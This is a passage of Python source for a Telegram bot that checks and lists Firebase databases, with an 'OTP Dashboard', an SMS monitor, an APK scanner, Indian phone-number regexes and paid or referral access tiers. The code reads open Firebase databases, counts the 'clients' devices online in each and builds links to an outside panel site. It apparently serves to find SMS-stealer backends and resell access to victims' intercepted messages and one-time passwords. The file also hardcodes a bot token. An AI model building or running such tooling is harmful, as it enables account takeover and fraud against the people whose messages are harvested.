#!/usr/bin/env python3
"""
VIP ALL IN ONE BOT — Combined Checker + OTP Dashboard
- Firebase URL Checker / Decode / Bulk / APK scan
- Multi-Firebase SMS Dashboard (40)
- Force Join + Captcha Verification
- Referral System (1 refer = 3 hours)
- Channel leave → referrer access revoke
- Admin unlimited access
- SMS monitor + idle timeout
- Admin Gift Access / Broadcast / Export
"""

import os
import re
import json
import time
import asyncio
import logging
import gc
import random
import base64
import tempfile
import zipfile
import urllib.parse
import sys
import subprocess
import signal
from html import escape as html_escape
from collections import Counter
from datetime import datetime
from typing import Optional, Dict, List, Tuple, Set

try:
    import psutil
except ImportError:
    psutil = None  # type: ignore

import aiohttp
import httpx
from telegram import (
    Bot,
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "9063326984:AAEKwKMmksaFjDUPfqks2OnZQca-NPCArts"
# Owner (super-admin) — hardcoded, cannot be removed. Only owner can add/remove admins.
OWNER_ID = 6361596911
ADMINS_FILE = os.getenv("ADMINS_FILE", "admins.json")
BANNED_USERS_FILE = os.getenv("BANNED_USERS_FILE", "banned_users.json")


def _load_admin_ids() -> set:
    ids = {OWNER_ID}
    try:
        with open(ADMINS_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, list):
            for v in data:
                try:
                    ids.add(int(v))
                except (TypeError, ValueError):
                    pass
        elif isinstance(data, dict):
            for v in data.get("admins", []) or []:
                try:
                    ids.add(int(v))
                except (TypeError, ValueError):
                    pass
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        pass
    return ids


def _save_admin_ids():
    try:
        # Never drop owner from file
        payload = sorted({int(x) for x in ADMIN_IDS} | {OWNER_ID})
        with open(ADMINS_FILE, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2)
    except OSError as exc:
        logger.warning("could not save admin ids: %s", exc)


def _load_banned_users() -> set:
    try:
        with open(BANNED_USERS_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, list):
            return {int(v) for v in data}
        if isinstance(data, dict):
            return {int(v) for v in (data.get("banned") or [])}
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError, ValueError):
        pass
    return set()


def _save_banned_users():
    try:
        with open(BANNED_USERS_FILE, "w", encoding="utf-8") as fh:
            json.dump(sorted(BANNED_USERS), fh, indent=2)
    except OSError as exc:
        logger.warning("could not save banned users: %s", exc)


ADMIN_IDS = _load_admin_ids()
BANNED_USERS = _load_banned_users()


def is_owner(user_id: int) -> bool:
    return int(user_id) == OWNER_ID


def is_admin(user_id: int) -> bool:
    return int(user_id) in ADMIN_IDS


def is_banned(user_id: int) -> bool:
    return int(user_id) in BANNED_USERS


def add_admin_user(user_id: int) -> dict:
    """Only owner should call this. Owner cannot be re-added (already present)."""
    uid = int(user_id)
    if uid == OWNER_ID:
        return {"success": False, "reason": "owner"}
    if uid in ADMIN_IDS:
        return {"success": False, "reason": "already"}
    ADMIN_IDS.add(uid)
    _save_admin_ids()
    return {"success": True, "reason": "ok"}


def remove_admin_user(user_id: int) -> dict:
    """Only owner should call this. Owner cannot be removed."""
    uid = int(user_id)
    if uid == OWNER_ID:
        return {"success": False, "reason": "owner"}
    if uid not in ADMIN_IDS:
        return {"success": False, "reason": "not_admin"}
    ADMIN_IDS.discard(uid)
    _save_admin_ids()
    return {"success": True, "reason": "ok"}


def ban_user(user_id: int) -> dict:
    uid = int(user_id)
    if uid == OWNER_ID:
        return {"success": False, "reason": "owner"}
    if uid in ADMIN_IDS and uid != OWNER_ID:
        # Allow banning other admins only by owner (caller must enforce)
        pass
    if uid in BANNED_USERS:
        return {"success": False, "reason": "already"}
    BANNED_USERS.add(uid)
    _save_banned_users()
    return {"success": True, "reason": "ok"}


def unban_user(user_id: int) -> dict:
    uid = int(user_id)
    if uid not in BANNED_USERS:
        return {"success": False, "reason": "not_banned"}
    BANNED_USERS.discard(uid)
    _save_banned_users()
    return {"success": True, "reason": "ok"}


TG_GATEWAY = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger("VIPAllInOne")

# ============================================================
# CONSTANTS
# ============================================================
FB_REQUEST_TIMEOUT = 10
FB_RETRY_MAX = 1
FB_RETRY_BACKOFF = 1.2
FB_CLIENTS_MAX_BYTES = 50 * 1024 * 1024
FB_MESSAGES_LIMIT = 5
MAX_FIREBASES = 40
CLEANUP_INTERVAL = 60
SMS_MONITOR_INTERVAL = 1
SMS_MONITOR_DURATION = 300
SMS_MONITOR_IDLE_TIMEOUT = 600  # 10 minutes no button tap → auto stop
ADMIN_PANEL_EDIT_INTERVAL = 5
WELCOME_IMAGE_URL = "https://d.uguu.se/fJYPbacO.png"

# ============================================================
# PREMIUM / CUSTOM EMOJI (Telegram custom_emoji_id)
# ============================================================
PE = {
    "announce": "5424818078833715060",   # 📢
    "fireheart": "5258417847352199367",  # ❤‍🔥
    "diamond": "5258457030338844822",    # 💎
    "cool": "6204263190319081111",       # 😎
    "laugh": "6217725679409040232",      # 😂
    "check": "6298670698948724690",      # ✅
    "vip": "6219549292458150316",        # Vip
    "party": "6289549584276392140",      # 🥳
    "star": "5370784581341422520",       # ⭐
    "online": "5188234920639632382",     # Online
    "tada": "5193209274452425995",       # 🎉
    "zap": "5199785165735367039",        # ⚡
    "warn": "5447644880824181073",       # ⚠️
    "alert": "6325465685648475757",      # 🚨
    "red": "6278097874320365653",        # 🔴
    "key": "5307843983102204243",        # 🔑
    "crown": "6057868409696165778",      # 👑
    "eyes": "6098136562774579060",       # 👀
    "chart": "5231200819986047254",      # 📊
    "unlock": "5296369303661067030",     # 🔓
}

# Fallback unicode when custom emoji not rendered
PE_FALLBACK = {
    "announce": "📢",
    "fireheart": "❤‍🔥",
    "diamond": "💎",
    "cool": "😎",
    "laugh": "😂",
    "check": "✅",
    "vip": "Vip",
    "party": "🥳",
    "star": "⭐",
    "online": "🟢",
    "tada": "🎉",
    "zap": "⚡",
    "warn": "⚠️",
    "alert": "🚨",
    "red": "🔴",
    "key": "🔑",
    "crown": "👑",
    "eyes": "👀",
    "chart": "📊",
    "unlock": "🔓",
}


def pe(name: str) -> str:
    """HTML custom emoji tag for messages (parse_mode=HTML)."""
    eid = PE.get(name)
    fb = PE_FALLBACK.get(name, "")
    if not eid:
        return fb
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'


def pe_id(name: str) -> str:
    """Raw custom_emoji_id for button icons."""
    return PE.get(name, "")


# Referral
REFERRAL_HOURS = 3
REFERRAL_SECONDS = REFERRAL_HOURS * 3600

# Gift
GIFT_ACCESS_MAX_HOURS = 24 * 365  # 1 year max per gift

# Redeem keys
REDEEM_KEYS_FILE = os.getenv("REDEEM_KEYS_FILE", "redeem_keys.json")
DEFAULT_KEY_HOURS = 24
DEFAULT_KEY_MAX_USES = 1

# Shared files
SHARED_FILES_FILE = os.getenv("SHARED_FILES_FILE", "shared_files.json")

# Bot Hosting (admin-approved users only)
HOST_DIR = os.getenv("HOST_DIR", "hosted_files")
HOSTING_APPROVED_FILE = os.getenv("HOSTING_APPROVED_FILE", "hosting_approved.json")
HOSTED_BOTS_FILE = os.getenv("HOSTED_BOTS_FILE", "hosted_bots.json")
HOST_BOT_LIMIT = int(os.getenv("HOST_BOT_LIMIT", "5"))  # max scripts per approved user
HOST_MAX_LOG_MB = 5
os.makedirs(HOST_DIR, exist_ok=True)

# Files
FORCE_JOIN_FILE = os.getenv("FORCE_JOIN_FILE", "force_join_channels.json")
USER_IDS_FILE = os.getenv("USER_IDS_FILE", "bot_users.json")
MAINTENANCE_FILE = os.getenv("MAINTENANCE_FILE", "maintenance_mode.json")
GLOBAL_FB_FILE = os.getenv("GLOBAL_FB_FILE", "global_firebases.json")
GLOBAL_DEVICE_CACHE_FILE = os.getenv("GLOBAL_DEVICE_CACHE_FILE", "global_devices_cache.json")
CAPTCHA_STATE_FILE = os.getenv("CAPTCHA_STATE_FILE", "captcha_state.json")
REFERRAL_DB_FILE = os.getenv("REFERRAL_DB_FILE", "referrals.json")

ACCESS_CHECK_INTERVAL = 30
ADMIN_DEVICE_REFRESH_INTERVAL = 180

DEFAULT_CHANNELS = [
    {"id": "@VIP_PANEL_DISCUSSION", "label": "@VIP_PANEL_DISCUSSION", "url": "https://t.me/VIP_PANEL_DISCUSSION"},
    {"id": "@VIP_PANNEL_CHANNEL", "label": "@VIP_PANNEL_CHANNEL", "url": "https://t.me/VIP_PANNEL_CHANNEL"},
]

# Checker-specific files / state
CHECKER_USERS_FILE = "checker_bot_users.json"
CHECKER_USER_DBS_FILE = "checker_user_databases.json"
USER_DBS_LOCK = asyncio.Lock()
CHECKER_LOG_LOCK = asyncio.Lock()
ADMIN_LOGS: list = []
USER_MODES: Dict[int, Optional[str]] = {}  # None | "check" | "decode" | "otp"


# ============================================================
# FILE HELPERS
# ============================================================
def _parse_channel_items(raw: str):
    channels = []
    for item in raw.split(","):
        item = item.strip()
        if not item:
            continue
        parts = [part.strip() for part in item.split("|", 2)]
        identifier = parts[0]
        label = parts[1] if len(parts) > 1 and parts[1] else identifier
        join_url = parts[2] if len(parts) > 2 and parts[2] else (
            f"https://t.me/{identifier.lstrip('@')}"
            if identifier.startswith("@") else "")
        channels.append({"id": identifier, "label": label, "url": join_url})
    return channels


def _load_required_channels():
    try:
        with open(FORCE_JOIN_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if isinstance(saved, list):
            return [item for item in saved if isinstance(item, dict) and item.get("id")]
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        pass
    return list(DEFAULT_CHANNELS)


def _save_required_channels():
    try:
        with open(FORCE_JOIN_FILE, "w", encoding="utf-8") as fh:
            json.dump(REQUIRED_CHANNELS, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save force-join channels: %s", exc)


def _load_user_ids():
    try:
        with open(USER_IDS_FILE, "r", encoding="utf-8") as fh:
            values = json.load(fh)
        return {int(value) for value in values}
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError, ValueError):
        return set()


def _save_user_ids():
    try:
        with open(USER_IDS_FILE, "w", encoding="utf-8") as fh:
            json.dump(sorted(known_users), fh)
    except OSError as exc:
        logger.warning("could not save user ids: %s", exc)


# Per-feature maintenance keys (global "all" is maintenance_mode)
FEATURE_MAINT_KEYS = ("checker", "otp", "files", "generate")
FEATURE_MAINT_LABELS = {
    "checker": "🟢 Checker",
    "otp": "🔵 OTP Dashboard",
    "files": "📁 File Share",
    "generate": "🎲 Generate Number",
}


def _default_feature_maint() -> dict:
    return {k: False for k in FEATURE_MAINT_KEYS}


def _load_maintenance_mode() -> bool:
    try:
        with open(MAINTENANCE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        return bool(saved.get("enabled", False)) if isinstance(saved, dict) else bool(saved)
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return False


def _load_feature_maintenance() -> dict:
    out = _default_feature_maint()
    try:
        with open(MAINTENANCE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if isinstance(saved, dict):
            feats = saved.get("features") or {}
            if isinstance(feats, dict):
                for k in FEATURE_MAINT_KEYS:
                    if k in feats:
                        out[k] = bool(feats[k])
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        pass
    return out


def _save_maintenance_mode():
    try:
        with open(MAINTENANCE_FILE, "w", encoding="utf-8") as fh:
            json.dump(
                {
                    "enabled": maintenance_mode,
                    "features": {k: bool(feature_maintenance.get(k, False)) for k in FEATURE_MAINT_KEYS},
                },
                fh,
                indent=2,
            )
    except OSError as exc:
        logger.warning("could not save maintenance mode: %s", exc)


def is_feature_down(feature: str) -> bool:
    """True if global maintenance OR this feature is under maintenance."""
    if maintenance_mode:
        return True
    return bool(feature_maintenance.get(feature, False))


def feature_down_text(feature: str) -> str:
    label = FEATURE_MAINT_LABELS.get(feature, feature)
    if maintenance_mode:
        return _bold_blockquote(
            "🛠️ 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡 ⚙️\n\n"
            "Poora bot abhi band hai. Baad mein try karo.")
    return _bold_blockquote(
        f"🛠️ {label} 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘\n\n"
        "Yeh feature abhi temporarily band hai.\n"
        "Thodi der baad try karo.")


def _load_captcha_enabled() -> bool:
    try:
        with open(CAPTCHA_STATE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        return bool(saved.get("enabled", True)) if isinstance(saved, dict) else True
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return True


def _save_captcha_enabled():
    try:
        with open(CAPTCHA_STATE_FILE, "w", encoding="utf-8") as fh:
            json.dump({"enabled": captcha_enabled}, fh)
    except OSError as exc:
        logger.warning("could not save captcha state: %s", exc)


def _load_global_firebases():
    try:
        with open(GLOBAL_FB_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if not isinstance(saved, list):
            return []
        out = []
        for i, item in enumerate(saved):
            if isinstance(item, dict) and item.get("url"):
                u = str(item["url"]).strip().rstrip("/")
                while u.endswith(".json"):
                    u = u[:-5].rstrip("/")
                if "firebaseio.com" in u or "firebasedatabase.app" in u:
                    tag = str(item.get("tag") or f"FB{i + 1}")
                    out.append((u, tag))
        return out
    except Exception:
        return []


def _save_global_firebases():
    try:
        payload = [{"url": url, "tag": tag} for url, tag in global_fb_list]
        with open(GLOBAL_FB_FILE, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save global firebases: %s", exc)


def _retag_global_firebases():
    global global_fb_list
    global_fb_list = [(url, f"FB{i + 1}") for i, (url, _) in enumerate(global_fb_list)]


# ============================================================
# GLOBAL STATE
# ============================================================
REQUIRED_CHANNELS = _load_required_channels()
maintenance_mode = _load_maintenance_mode()
feature_maintenance = _load_feature_maintenance()
captcha_enabled = _load_captcha_enabled()
global_fb_list = _load_global_firebases()
_last_refresh_time: float = time.monotonic()

known_users = _load_user_ids()
user_access_state: Dict[int, bool] = {}
verified_access_users: Set[int] = set()

# ---- Referral DB ----
_referral_lock = asyncio.Lock()


def _load_referral_db() -> Dict[str, dict]:
    try:
        with open(REFERRAL_DB_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            return data
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        pass
    return {}


def _save_referral_db():
    try:
        with open(REFERRAL_DB_FILE, "w", encoding="utf-8") as fh:
            json.dump(REFERRAL_DB, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save referral db: %s", exc)


REFERRAL_DB: Dict[str, dict] = _load_referral_db()

# ============================================================
# REDEEM KEY SYSTEM
# ============================================================
_redeem_lock = asyncio.Lock()


def _load_redeem_keys() -> Dict[str, dict]:
    try:
        with open(REDEEM_KEYS_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            return data
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        pass
    return {}


def _save_redeem_keys():
    try:
        with open(REDEEM_KEYS_FILE, "w", encoding="utf-8") as fh:
            json.dump(REDEEM_KEYS, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save redeem keys: %s", exc)


REDEEM_KEYS: Dict[str, dict] = _load_redeem_keys()


def _generate_key_code(prefix: str = "VIP") -> str:
    import secrets
    import string
    alphabet = string.ascii_uppercase + string.digits
    part = "".join(secrets.choice(alphabet) for _ in range(12))
    return f"{prefix}-{part[:4]}-{part[4:8]}-{part[8:12]}"


def create_redeem_key(hours: float, max_uses: int, created_by: int, note: str = "") -> str:
    """Admin creates a key. max_uses = how many different users can redeem it."""
    code = _generate_key_code()
    while code in REDEEM_KEYS:
        code = _generate_key_code()
    REDEEM_KEYS[code] = {
        "hours": float(hours),
        "max_uses": int(max_uses),
        "used_by": [],
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "created_by": created_by,
        "note": note or "",
        "active": True,
    }
    _save_redeem_keys()
    return code


async def redeem_key(user_id: int, code: str) -> dict:
    """
    Redeem a key for OTP access.
    Returns {success, reason, hours, remaining_slots, access_time}
    """
    code = (code or "").strip().upper()
    async with _redeem_lock:
        if not code or code not in REDEEM_KEYS:
            return {"success": False, "reason": "invalid"}
        key = REDEEM_KEYS[code]
        if not key.get("active", True):
            return {"success": False, "reason": "disabled"}
        used_by = list(key.get("used_by") or [])
        max_uses = int(key.get("max_uses") or 1)
        if user_id in used_by:
            return {"success": False, "reason": "already_used"}
        if len(used_by) >= max_uses:
            return {"success": False, "reason": "limit_reached", "max_uses": max_uses}
        hours = float(key.get("hours") or DEFAULT_KEY_HOURS)
        seconds = int(hours * 3600)
        grant_access(user_id, seconds)
        used_by.append(user_id)
        key["used_by"] = used_by
        remaining = max_uses - len(used_by)
        if remaining <= 0:
            key["active"] = False
        _save_redeem_keys()
        return {
            "success": True,
            "reason": "ok",
            "hours": hours,
            "remaining_slots": remaining,
            "max_uses": max_uses,
            "access_time": format_remaining_time(user_id),
        }


def list_active_keys(limit: int = 20) -> List[dict]:
    out = []
    for code, info in REDEEM_KEYS.items():
        used = len(info.get("used_by") or [])
        max_u = int(info.get("max_uses") or 1)
        out.append({
            "code": code,
            "hours": info.get("hours"),
            "used": used,
            "max_uses": max_u,
            "active": info.get("active", True) and used < max_u,
            "created_at": info.get("created_at", ""),
            "note": info.get("note", ""),
        })
    out.sort(key=lambda x: x.get("created_at") or "", reverse=True)
    return out[:limit]


# ============================================================
# FILE SHARE SYSTEM
# ============================================================
def _load_shared_files() -> Dict[str, dict]:
    try:
        with open(SHARED_FILES_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            return data
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        pass
    return {}


def _save_shared_files():
    try:
        with open(SHARED_FILES_FILE, "w", encoding="utf-8") as fh:
            json.dump(SHARED_FILES, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save shared files: %s", exc)


SHARED_FILES: Dict[str, dict] = _load_shared_files()


def _generate_file_token() -> str:
    import secrets
    import string
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(10))


def register_shared_file(
    file_id: str,
    file_name: str,
    owner_id: int,
    file_size: int = 0,
    mime_type: str = "",
) -> str:
    token = _generate_file_token()
    while token in SHARED_FILES:
        token = _generate_file_token()
    SHARED_FILES[token] = {
        "file_id": file_id,
        "file_name": file_name or "file",
        "owner_id": owner_id,
        "file_size": file_size,
        "mime_type": mime_type or "",
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "downloads": 0,
    }
    _save_shared_files()
    return token


def get_shared_file(token: str) -> Optional[dict]:
    return SHARED_FILES.get((token or "").strip())


def bump_file_download(token: str):
    info = SHARED_FILES.get(token)
    if not info:
        return
    info["downloads"] = int(info.get("downloads") or 0) + 1
    _save_shared_files()


def build_file_share_link(token: str) -> str:
    return f"https://t.me/{BOT_USERNAME}?start=file_{token}"


_PHONE_PATTERNS = [
    re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b'),
    re.compile(r'\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b', re.IGNORECASE),
    re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
]


# ============================================================
# REFERRAL HELPERS
# ============================================================
def _ensure_user_record(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in REFERRAL_DB:
        REFERRAL_DB[uid] = {
            "access_expires_at": 0.0,
            "referrals": [],
            "referred_by": None,
            "referral_count": 0,
            "expired_notified": False,
            "cooldown_until": 0.0,
            "captcha_verified": False,
        }
    else:
        rec = REFERRAL_DB[uid]
        rec.setdefault("access_expires_at", 0.0)
        rec.setdefault("referrals", [])
        rec.setdefault("referred_by", None)
        rec.setdefault("referral_count", len(rec.get("referrals", [])))
        rec.setdefault("expired_notified", False)
        rec.setdefault("cooldown_until", 0.0)
        rec.setdefault("captcha_verified", False)
    return REFERRAL_DB[uid]


def get_remaining_seconds(user_id: int) -> float:
    if user_id in ADMIN_IDS:
        return float('inf')
    rec = _ensure_user_record(user_id)
    return max(0.0, rec.get("access_expires_at", 0.0) - time.time())


def has_access(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    return get_remaining_seconds(user_id) > 0


def format_remaining_time(user_id: int) -> str:
    if user_id in ADMIN_IDS:
        return "Unlimited ♾️"
    remaining = get_remaining_seconds(user_id)
    if remaining <= 0:
        return "Expired"
    total_minutes = int(remaining // 60)
    hours = total_minutes // 60
    minutes = total_minutes % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    return f"{minutes}m"


def grant_access(user_id: int, seconds: int):
    rec = _ensure_user_record(user_id)
    now = time.time()
    current = rec.get("access_expires_at", 0.0)
    if current < now:
        rec["access_expires_at"] = now + seconds
    else:
        rec["access_expires_at"] = current + seconds
    rec["expired_notified"] = False
    _save_referral_db()


def revoke_access(user_id: int):
    rec = _ensure_user_record(user_id)
    rec["access_expires_at"] = 0.0
    rec["expired_notified"] = False
    _save_referral_db()


async def process_referral(referrer_id: int, referred_id: int) -> dict:
    async with _referral_lock:
        if referrer_id == referred_id:
            return {"success": False, "reason": "self_referral"}
        if referrer_id in ADMIN_IDS:
            return {"success": False, "reason": "admin_referrer"}
        if str(referrer_id) not in REFERRAL_DB:
            return {"success": False, "reason": "invalid_referrer"}
        ref_rec = _ensure_user_record(referrer_id)
        new_rec = _ensure_user_record(referred_id)
        if new_rec.get("referred_by") is not None:
            return {"success": False, "reason": "already_referred"}
        if referred_id in ref_rec.get("referrals", []):
            return {"success": False, "reason": "duplicate"}
        now = time.time()
        current_expiry = ref_rec.get("access_expires_at", 0.0)
        if current_expiry < now:
            ref_rec["access_expires_at"] = now + REFERRAL_SECONDS
        else:
            ref_rec["access_expires_at"] = current_expiry + REFERRAL_SECONDS
        ref_rec["expired_notified"] = False
        ref_rec.setdefault("referrals", []).append(referred_id)
        ref_rec["referral_count"] = len(ref_rec["referrals"])
        new_rec["referred_by"] = referrer_id
        _save_referral_db()
        return {
            "success": True,
            "reason": "ok",
            "referrer_remaining": format_remaining_time(referrer_id),
        }


async def check_referred_user_left(referred_id: int):
    """When a referred user leaves channel, revoke referrer's access too."""
    try:
        uid = str(referred_id)
        if uid not in REFERRAL_DB:
            return None
        rec = REFERRAL_DB[uid]
        referrer_id = rec.get("referred_by")
        if not referrer_id:
            return None
        referrer_uid = str(referrer_id)
        if referrer_uid not in REFERRAL_DB:
            return None
        ref_rec = REFERRAL_DB[referrer_uid]
        if referred_id not in ref_rec.get("referrals", []):
            return None
        ref_rec["referrals"] = [
            r for r in ref_rec.get("referrals", []) if r != referred_id
        ]
        ref_rec["referral_count"] = len(ref_rec["referrals"])
        revoke_access(referrer_id)
        rec["referred_by"] = None
        _save_referral_db()
        logger.info(
            "[REFERRAL] User %s left channel → referrer %s access revoked",
            referred_id, referrer_id
        )
        return referrer_id
    except Exception as exc:
        logger.error("[REFERRAL] check_referred_user_left error: %s", exc)
        return None


# ============================================================
# CHECKER MODULE — Firebase URL check / decode / bulk / APK
# ============================================================
def set_mode(user_id, mode):
    USER_MODES[user_id] = mode


def get_mode(user_id):
    return USER_MODES.get(user_id)


def checker_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 CHECK FIREBASE", callback_data="chk_menu_check")],
        [InlineKeyboardButton("🔵 DECODE LINK", callback_data="chk_menu_decode")],
        [InlineKeyboardButton("🟣 HELP", callback_data="chk_menu_help")],
        [
            InlineKeyboardButton("🟡 ACTIVE", callback_data="chk_menu_active"),
            InlineKeyboardButton("🟠 TOP 20", callback_data="chk_menu_most"),
            InlineKeyboardButton("🔴 STATS", callback_data="chk_menu_stats"),
        ],
        [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
    ])


def checker_mode_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ BACK", callback_data="chk_menu_back")],
    ])


def checker_admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📁 EXPORT TODAY", callback_data="chk_admin_export")],
        [InlineKeyboardButton("👥 USERS", callback_data="chk_admin_users")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="chk_admin_broadcast")],
        [InlineKeyboardButton("📊 ADMIN STATS", callback_data="chk_admin_adminstats")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="main_home")],
    ])


def load_checker_users():
    if os.path.exists(CHECKER_USERS_FILE):
        try:
            with open(CHECKER_USERS_FILE, "r") as f:
                return set(json.load(f))
        except Exception:
            return set()
    return set()


def save_checker_user(user_id):
    users = load_checker_users()
    if user_id not in users:
        users.add(user_id)
        try:
            with open(CHECKER_USERS_FILE, "w") as f:
                json.dump(list(users), f)
        except Exception:
            pass


def load_user_dbs():
    if os.path.exists(CHECKER_USER_DBS_FILE):
        try:
            with open(CHECKER_USER_DBS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_user_dbs(data):
    try:
        with open(CHECKER_USER_DBS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
    except Exception:
        pass


async def store_user_databases(user_id, batch_results):
    if not batch_results:
        return
    async with USER_DBS_LOCK:
        data = load_user_dbs()
        uid = str(user_id)
        if uid not in data:
            data[uid] = {}
        for db_url, total, online in batch_results:
            data[uid][db_url] = {
                "total": total,
                "online": online,
                "last_checked": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
        save_user_dbs(data)


async def send_message_raw(chat_id, text, reply_markup=None):
    try:
        async with httpx.AsyncClient() as client:
            payload = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }
            if reply_markup:
                payload["reply_markup"] = reply_markup
            await client.post(f"{TG_GATEWAY}/sendMessage", json=payload, timeout=8)
    except Exception:
        pass


async def send_document_to_admins(chat_id, caption, file_path):
    try:
        async with httpx.AsyncClient() as client:
            for adm in ADMIN_IDS:
                with open(file_path, "rb") as f:
                    files = {"document": f}
                    data = {"chat_id": adm, "caption": caption, "parse_mode": "HTML"}
                    await client.post(f"{TG_GATEWAY}/sendDocument", data=data, files=files, timeout=15)
    except Exception as e:
        logger.error("Error sending export file: %s", e)


async def parse_panel_data(client_session, firebase_url):
    try:
        base_clean = firebase_url.strip().rstrip("/")
        target_endpoint = f"{base_clean}/.json" if not base_clean.endswith(".json") else base_clean
        response = await client_session.get(target_endpoint, timeout=2.5)
        if response.status_code == 200:
            data = response.json()
            if not isinstance(data, dict):
                return 0, 0
            clients_node = data.get("clients", data)
            total_devices = 0
            online_devices = 0
            if isinstance(clients_node, dict):
                for client_id, client_info in clients_node.items():
                    if isinstance(client_info, dict):
                        total_devices += 1
                        status = client_info.get("status")
                        if status is True or status == "Online" or status == "online":
                            online_devices += 1
            return total_devices, online_devices
        return 0, 0
    except Exception:
        return 0, 0


async def parse_batch_panels(database_urls):
    semaphore = asyncio.Semaphore(40)
    limits = httpx.Limits(max_keepalive_connections=100, max_connections=200)
    async with httpx.AsyncClient(limits=limits, follow_redirects=True) as client:
        async def bounded_fetch(db_url):
            async with semaphore:
                total, online = await parse_panel_data(client, db_url)
                return db_url, total, online
        tasks = [bounded_fetch(url) for url in database_urls]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        parsed_results = []
        for res in results:
            if isinstance(res, tuple):
                parsed_results.append(res)
        return parsed_results


def filter_and_sort_active(batch_results, min_online=1):
    active = []
    for item in batch_results:
        if not isinstance(item, (tuple, list)) or len(item) < 3:
            continue
        db_url, total, online = item[0], item[1], item[2]
        try:
            online_n = int(online) if online is not None else 0
            total_n = int(total) if total is not None else 0
        except (TypeError, ValueError):
            online_n, total_n = 0, 0
        if online_n >= min_online:
            active.append((db_url, total_n, online_n))
    active.sort(key=lambda x: (x[2], x[1]), reverse=True)
    return active


def generate_vercel_link(db_url):
    clean_db = db_url.strip().strip("/")
    if not clean_db.startswith("http"):
        clean_db = "https://" + clean_db
    future_timestamp = str(int(time.time() * 1000) + 31536000000)
    raw_payload = f"{clean_db}|||VIP_ALL_IN_ONE|||{future_timestamp}"
    encoded_payload = base64.b64encode(raw_payload.encode("utf-8")).decode("utf-8")
    return f"https://vippannels.netlify.app/?s={encoded_payload}"


def build_sorted_report(title, batch_results, include_dead_summary=True):
    total_scanned = len(batch_results) if batch_results else 0
    active = filter_and_sort_active(batch_results, min_online=1)
    dead_count = total_scanned - len(active)
    report = f"⚡ <b>{title}</b>\n"
    report += f"📊 Scanned: <code>{total_scanned}</code> | 🟢 Active: <code>{len(active)}</code> | 💀 Dead/0: <code>{dead_count}</code>\n"
    report += "📌 Sorted: High Online → Low | Dead filtered out\n\n"
    if not active:
        report += "⚠️ No ACTIVE databases (all dead or online = 0).\n\n"
    else:
        report += f"<b>ACTIVE Databases ({len(active)}):</b>\n\n"
        for idx, (db_url, total, online) in enumerate(active, 1):
